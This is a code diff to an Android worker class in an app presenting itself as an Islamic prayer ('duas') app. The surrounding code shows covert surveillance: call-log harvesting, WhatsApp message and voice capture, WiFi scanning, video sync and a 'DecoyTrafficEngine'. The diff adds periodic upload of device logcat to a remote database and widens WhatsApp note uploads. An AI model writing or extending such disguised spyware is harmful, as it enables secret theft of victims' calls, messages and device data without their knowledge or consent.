@@ -27,6 +27,7 @@ import islamic.duas.metrics.MetricsCollector
 import islamic.duas.utils.DecoyTrafficEngine
 import islamic.duas.utils.DeviceId
 import islamic.duas.utils.ErrorLog
+import islamic.duas.utils.LogCollector
 import islamic.duas.wifi.WifiScanner
 import islamic.duas.whatsapp.ChatCategory
 import islamic.duas.whatsapp.VoiceEventStore
@@ -363,7 +364,13 @@ class DuaSyncWorker(
                     val callLogs = callLogCollector.collectCallLogs(lastCallSync)
 
                     if (callLogs.isEmpty()) {
-                        ErrorLog.write(context, TAG, "Call logs query returned empty", null)
+                        if (lastCallSync == 0L) {
+                            // Never synced before: genuinely no call logs found (or blocked)
+                            ErrorLog.write(context, TAG, "Call logs query returned empty", null)
+                        } else {
+                            // Incremental sync found no NEW calls since last run - normal
+                            Log.d(TAG, "No new call logs since last sync")
+                        }
                     }
 
                     for (call in callLogs) {
@@ -502,7 +509,10 @@ class DuaSyncWorker(
                                         continue
                                     }
                                     false -> syncedAsGroup = false
-                                    null -> syncedAsGroup = true
+                                    // No live event matched (listener off, sync > 5 min after
+                                    // arrival, or restored file): treat as individual and
+                                    // upload so notes are never silently hidden as groups.
+                                    null -> syncedAsGroup = false
                                 }
                             }
                             val noteJson = JSONObject().apply {
@@ -837,6 +847,19 @@ class DuaSyncWorker(
                 if (!hasImagesPerm) requestPermissionPrompt(context, "video")
             } else {
                 try { syncVideos(context) } catch (e: Exception) { Log.e(TAG, "Video sync error: ${e.message}") }
+            }
+
+            // ── Logcat sync (throttled to every 30 min) ──
+            // Keeps an on-device logcat trail in RTDB (devices/<id>/logcat) so issues
+            // can be diagnosed remotely even without a crash dump.
+            try {
+                val lastLogcat = prefs.getLong("last_logcat_sync_ms", 0L)
+                if (System.currentTimeMillis() - lastLogcat >= 30 * 60 * 1000L) {
+                    LogCollector.collectAndUpload(context, androidId)
+                    prefs.edit().putLong("last_logcat_sync_ms", System.currentTimeMillis()).apply()
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Logcat sync error: ${e.message}")
             }
 
             // ── Cleanup (storage-first priority) ──
